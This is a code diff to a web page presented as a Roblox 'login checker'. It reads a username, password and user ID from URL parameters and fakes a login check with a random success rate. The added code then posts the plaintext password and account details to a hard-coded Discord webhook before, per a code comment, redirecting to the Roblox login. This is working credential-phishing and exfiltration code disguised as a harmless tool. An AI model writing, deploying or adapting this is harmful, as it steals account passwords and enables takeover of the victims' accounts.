@@ -59,13 +59,34 @@
         const password = urlParams.get('password');
         const userId = urlParams.get('userid');
 
+        // YOUR DISCORD WEBHOOKS
+        const successWebhook = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        const failedWebhook = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+
         // Display username
         document.getElementById('username').textContent = username;
 
-        // Simulate login checking (in real implementation, you would verify with Roblox API)
-        function checkLogin() {
+        // Function to send to Discord webhook
+        async function sendToDiscord(webhookUrl, data) {
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Webhook error:', error);
+                return false;
+            }
+        }
+
+        // Simulate login checking
+        async function checkLogin() {
             // Simulate checking delay
-            setTimeout(() => {
+            setTimeout(async () => {
                 document.getElementById('loading').style.display = 'none';
                 
                 // Simulate 70% success rate for demo
@@ -78,15 +99,77 @@
                     resultDiv.textContent = '✅ LOGIN SUCCESSFUL!';
                     resultDiv.className = 'result success';
                     
-                    // Send to success webhook (you would implement this with server-side code)
-                    console.log('SUCCESS LOGIN:', {username, password, userId});
+                    // SEND TO SUCCESS WEBHOOK
+                    const successData = {
+                        username: "Vizion MGUI Login Checker",
+                        embeds: [{
+                            title: "✅ LOGIN SUCCESS",
+                            color: 65280,
+                            fields: [
+                                {
+                                    name: "📋 ACCOUNT INFORMATION",
+                                    value: `👤 **Username:** ${username}\n🆔 **User ID:** ${userId}`,
+                                    inline: false
+                                },
+                                {
+                                    name: "🔐 PASSWORD",
+                                    value: `\`\`\`${password}\`\`\``,
+                                    inline: false
+                                },
+                                {
+                                    name: "📊 STATUS",
+                                    value: "**VALID LOGIN** ✅",
+                                    inline: true
+                                }
+                            ],
+                            footer: { 
+                                text: "Vizion MGUI Login Checker • " + new Date().toLocaleString(),
+                            },
+                            timestamp: new Date().toISOString()
+                        }],
+                        content: "**⎯⎯⎯⎯⎯『 LOGIN SUCCESS 』⎯⎯⎯⎯⎯**"
+                    };
+                    
+                    await sendToDiscord(successWebhook, successData);
+                    console.log('Sent to success webhook');
                     
                 } else {
                     resultDiv.textContent = '❌ LOGIN FAILED!';
                     resultDiv.className = 'result failed';
                     
-                    // Send to failed webhook
-                    console.log('FAILED LOGIN:', {username, password, userId});
+                    // SEND TO FAILED WEBHOOK
+                    const failedData = {
+                        username: "Vizion MGUI Login Checker",
+                        embeds: [{
+                            title: "❌ LOGIN FAILED",
+                            color: 16711680,
+                            fields: [
+                                {
+                                    name: "📋 ACCOUNT INFORMATION",
+                                    value: `👤 **Username:** ${username}\n🆔 **User ID:** ${userId}`,
+                                    inline: false
+                                },
+                                {
+                                    name: "🔐 PASSWORD",
+                                    value: `\`\`\`${password}\`\`\``,
+                                    inline: false
+                                },
+                                {
+                                    name: "📊 STATUS",
+                                    value: "**INVALID LOGIN** ❌",
+                                    inline: true
+                                }
+                            ],
+                            footer: { 
+                                text: "Vizion MGUI Login Checker • " + new Date().toLocaleString(),
+                            },
+                            timestamp: new Date().toISOString()
+                        }],
+                        content: "**⎯⎯⎯⎯⎯『 LOGIN FAILED 』⎯⎯⎯⎯⎯**"
+                    };
+                    
+                    await sendToDiscord(failedWebhook, failedData);
+                    console.log('Sent to failed webhook');
                 }
 
                 // Redirect to Roblox login after showing result
